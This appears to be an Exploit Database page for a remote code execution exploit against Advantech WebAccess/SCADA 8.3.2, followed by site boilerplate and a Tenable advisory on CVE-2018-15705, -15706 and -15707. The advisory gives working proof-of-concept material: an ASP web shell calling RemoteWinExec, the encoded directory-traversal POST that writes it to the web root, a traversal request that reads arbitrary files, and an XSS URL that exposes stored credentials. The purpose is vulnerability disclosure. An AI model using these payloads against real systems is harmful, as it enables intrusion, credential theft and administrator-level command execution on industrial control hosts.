desc = '''This exploit targets Advantech WebAccess/SCADA 8.3.2. It has been tested against Windows 2008 R2 x64.

The goal of the script is to execute code remotely. User interaction is required.

The following operations will be conducted:
1) Ensure WebAccess application is running. (TCP port 80 by default)
2) Ensure WADashboard is running. (TCP port 8081 by default)
3) Ensure user-specified project exists.
4) Ensure user-specified node exists.
5) Generate malicious link to send to victim user. (exploits CVE-2018-15707 to steal credentials via XSS)
6) Start HTTP listener to receive credentials when victim clicks the link.
7) Login to WADashboard.
8) Write a malicious ASP file to the root of the WebAccess application. (exploits CVE-2018-15705)
Note: elevated privileges will be obtained using the Webdraw RemoteWinExec function.
9) Execute user-specified command.

Example (equivalent) commands:
python script.py -t 192.168.0.2 -p1 80 -p2 8081 -https false -proj myproject -node mynode -ip 192.168.0.3 -port 9999 -cmd calc.exe

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

# [R1] Multiple Advantech WebAccess Vulnerabilities

Critical

[← View More Research Advisories](/security/research)
### Synopsis

Tenable has discovered multiple vulnerabilities in Advantech WebAccess/SCADA 8.3.2.

#### CVE-2018-15705: WADashboard API ‘writeFile’ Authenticated Directory Traversal A directory traversal vulnerability exists in the Node.js WADashboard API. The vulnerability can be exploited remotely to write or overwrite arbitrary files on the file system. Authentication is required for successful exploitation; however, a low-privileged (“restricted”) user can be used. Given that a classic ASP web application is hosted alongside this API, an attacker may write ASP scripts and subsequently launch these without authentication. Please note that the API process (WADashboard.exe) runs with Administrator OS privileges. This means files can be written to virtually any directory on disk. Specifically, the vulnerability exists due to the lack of input validation when processing the 'folderpath' parameter in an HTTP POST request to '/WADashboard/api/dashboard/v1/files/writeFile'. By specifying crafted values for the 'folderpath' and 'msg' parameters, an attacker can create an ASP script in the C:\Inetpub\wwwroot\broadweb directory to execute code remotely. In IIS, the 'broadweb' web application is contained by the 'Broadweb\_pool' application pool. This application pool specifies a process identity of 'ApplicationPoolIdentity'. This means that an attacker's ASP code runs with these privileges by default. However, a 'webdobj.webdraw' class can be instantiated, giving an attacker access to the 'RemoteWinExec' function. By utilizing this function in the ASP code, the attacker can execute OS commands with Administrator privileges. Below is ASP code that could be written to a file to facilitate command execution. ``` <% Set t=Server.CreateObject("webdobj.webdraw"):t.RemoteWinExec Request.QueryString("p"),Request.QueryString("n"),Request.QueryString("c"):Response.Write "Executed command..."%> ``` The following HTTP POST request exploits the directory traversal and writes the above ASP code as ‘exec.asp’. It will be written to C:\Inetpub\wwwroot\broadweb\. ``` POST /WADashboard/api/dashboard/v1/files/writeFile?projectSpecies=myproject!savedConfiguration&folderpath=../../../../exec.asp&msg=%3c%25%20%53%65%74%20%74%3d%53%65%72%76%65%72%2e%43%72%65%61%74%65%4f%62%6a%65%63%74%28%22%77%65%62%64%6f%62%6a%2e%77%65%62%64%72%61%77%22%29%3a%74%2e%52%65%6d%6f%74%65%57%69%6e%45%78%65%63%20%52%65%71%75%65%73%74%2e%51%75%65%72%79%53%74%72%69%6e%67%28%22%70%22%29%2c%52%65%71%75%65%73%74%2e%51%75%65%72%79%53%74%72%69%6e%67%28%22%6e%22%29%2c%52%65%71%75%65%73%74%2e%51%75%65%72%79%53%74%72%69%6e%67%28%22%63%22%29%3a%52%65%73%70%6f%6e%73%65%2e%57%72%69%74%65%20%22%45%78%65%63%75%74%65%64%20%63%6f%6d%6d%61%6e%64%2e%2e%2e%22%25%3e&overwrite=true HTTP/1.1 ``` After exec.asp is written, the attacker can modify the following link to execute commands of his/her choosing. Please note that the ‘p’ and ‘n’ parameter values must be valid. These can be determined using enumeration methods. ``` http://192.168.1.194/broadweb/exec.asp?p=myproject&n=mynode&c=calc.exe ``` CVE-2018-15706: WADashboard API ‘readFile’ Authenticated Directory Traversal A directory traversal vulnerability exists in the Node.js WADashboard API ‘readFile’ method. The vulnerability can be exploited remotely to read arbitrary files on the file system; however, it does require authentication. This can be accomplished using a WebAccess account with "restricted" privileges (not power user). Please note that the API process (WADashboard.exe) runs with Administrator OS privileges. This means that virtually any file can be read. The vulnerability exists due to the lack of input validation when processing the 'filepath' parameter in an HTTP GET request to '/WADashboard/api/dashboard/v1/files/readFile'. By specifying a crafted ‘filepath’ value, an attacker can read any file on the filesystem. Below is a proof of concept HTTP GET request crafted to read C:\windows\win.ini. Take note of the project name, “myproject”. ``` GET /WADashboard/api/dashboard/v1/files/readFile?projectSpecies=myproject!savedDashboard&filepath=../../../../../../../windows/win.ini&_=1540926323132 HTTP/1.1 ``` The corresponding JSON response body is below. ``` {"resStatus":"0","resString":"; for 16-bit app support\r\n[fonts]\r\n[extensions]\r\n[mci extensions]\r\n[files]\r\n[Mail]\r\nMAPI=1"} ``` CVE-2018-15707: Bwmainleft.asp ‘pname’ User Credential Disclosure via Reflected Cross-site Scripting A reflected cross-site scripting vulnerability exists in broadweb/bwmainleft.asp because the ‘pname’ GET parameter is not properly validated or sanitized. Furthermore, the active session’s credentials are written into the HTML source and can be accessed by client-side JavaScript. There are several areas where the raw value of 'pname' is written to the page; however, there is a JavaScript block which requires special attention. Below is a code snippet from bwMainLeft.asp. Take note of how 'username' and 'password' are written directly to the page using ASP. ``` … snip … pname = Request.QueryString("pname") … snip … username = session("UserName") 'get the password if admin if username = "admin" then sql = "SELECT * FROM pUserPassword WHERE UserName='" + username + "'" else sql = "SELECT * FROM pAdmin WHERE UserName='" + username + "'" end if dbTab.open sql,cfgConn,3,2,1 'get the password from database based on the user name, note that only admin can actually log into dashboard here if not dbTab.eof then set tWAObj = Server.CreateObject("webdobj.webdraw") GetUserPwdField dbTab, tWAObj, UsrArr 'get the password from db pwd = UsrArr(0) %> <script> //Logon the webservice to use all other webservices logOnWebService("<%=username%>", "<%=pwd%>"); readNodeStatus("<%=username%>", "<%=pwd%>","<%=pname%>"); </script> … snip … ``` Below is a proof of concept URL. ``` http://192.168.1.194/broadweb/bwmainleft.asp?pid=1&pname=%22);alert(document.getElementsByTagName(%27script%27)[4].text);// ``` To clarify further, the cross-site scripting vulnerability can be exploited to extract the values of username and password. An attacker can steal the credentials using this technique. In the screenshot below, the username is “admin” and the password is “scooby”.
